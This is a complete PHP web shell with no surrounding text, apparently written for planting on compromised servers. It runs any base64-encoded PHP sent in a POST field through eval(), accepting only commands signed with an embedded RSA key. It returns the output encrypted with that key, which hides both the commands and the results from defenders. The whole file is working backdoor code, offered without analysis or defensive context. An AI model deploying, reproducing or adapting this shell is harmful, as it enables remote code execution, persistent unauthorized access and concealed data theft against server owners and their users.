<?php
#Author: CBiu
$PUB_KEY = '-----BEGIN PUBLIC KEY-----
MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgHw6fTCgWdoCEau6H5YDp66rH02U
AhhaBNFspmqSZCsBpYK+c6LyKlYRMYGGNlF7UA5cXAvcZFHHKoaQaHrPqrZ8hPCg
E2cjsYrzeUR79c/8rCQ6BndcF6CkRz15yaNmY7h8iknq3AofDEIG2O7y0IvJyOT5
0ebw7kIG4S1/aHiNAgMBAAE=
-----END PUBLIC KEY-----';
$pub_key = openssl_pkey_get_public($PUB_KEY);
$cmd = base64_decode($_POST['s']);
$sign = base64_decode($_POST['sign']);
if (!openssl_verify($cmd, $sign, $pub_key)){
	die('verify fail');
}
$result = str_split(eval($cmd), 117);
foreach($result as $o){
	openssl_public_encrypt($o, $sub_enc, $pub_key);
	$arr[]=$sub_enc;
}
$crypted = implode('', $arr);
openssl_free_key($pub_key);
echo base64_encode($crypted);
